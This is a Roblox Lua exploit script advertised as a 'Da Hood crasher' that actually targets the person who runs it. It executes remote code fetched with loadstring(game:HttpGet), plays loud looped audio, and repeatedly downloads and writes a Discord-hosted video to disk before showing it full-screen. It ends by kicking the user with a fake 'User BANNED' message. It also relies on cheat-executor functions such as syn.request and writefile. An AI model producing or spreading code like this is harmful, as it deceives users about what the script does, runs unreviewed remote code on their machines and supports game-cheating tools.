--[[

    BEST DA HOOD CRASHER EVER JOE CRASHER 10/10!!

]]--

-- // Check game
if game.PlaceId ~= 2788229376 then
    game:GetService("Players").LocalPlayer:Kick("ERROR: Script only works inside of Da Hood.")
    task.wait(3)
    game:Shutdown()
end

-- // Await until game is fully loaded
repeat task.wait() until game:IsLoaded()
repeat task.wait() until game:GetService("Workspace").Players:FindFirstChild(game:GetService("Players").LocalPlayer.Name)

-- // Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

-- // Variables
local LocalPlayer = Players.LocalPlayer
local HTTP_Request = syn.request or request
local Asset = getsynasset or getcustomasset
local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
local Notification = NotificationLibrary.Notify

-- // Loading notification
Notification({Title = "Joe Crasher", Description = "Loading...", Duration = 4})

-- // "loading the crasher" (real)
task.wait(4)

-- // Playing annoying audio XD
local Audio = Instance.new("Sound", Workspace)
Audio.SoundId = "rbxassetid://142376088"
Audio.Volume = 10
Audio.Name = "RAINING TACOSSSS"
Audio.Looped = true
Audio:Play()

-- // Spamming a funny gif 🤭
if (readfile and writefile) then
    pcall(function()
        while task.wait() do
            
            local VideoData = HTTP_Request({
                Url = "https://cdn.discordapp.com/attachments/1077333800478052442/1077607608736813076/ezgif.com-gif-to-webm.webm",
                Method = "GET",
            })

            if VideoData.Success then
                VideoData = VideoData.Body
            else
                LocalPlayer:Kick("Joe Crasher failed to load :(")
                return
            end
            
            writefile("Joe_Crasher.webm", VideoData)
            local Video = Asset("Joe_Crasher.webm")

            local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
            local VideoFrame = Instance.new('VideoFrame', ScreenGui)
            VideoFrame.Video = Video
            VideoFrame.Visible = true
            VideoFrame.Size = UDim2.new(1, 0, 1, 0)
            VideoFrame:Play()
            
            task.wait(3)

        end
    end)
end

-- // Funny fake ban kick!!!
task.spawn(function()
    task.wait(12)
    LocalPlayer:Kick("User BANNED")
end)
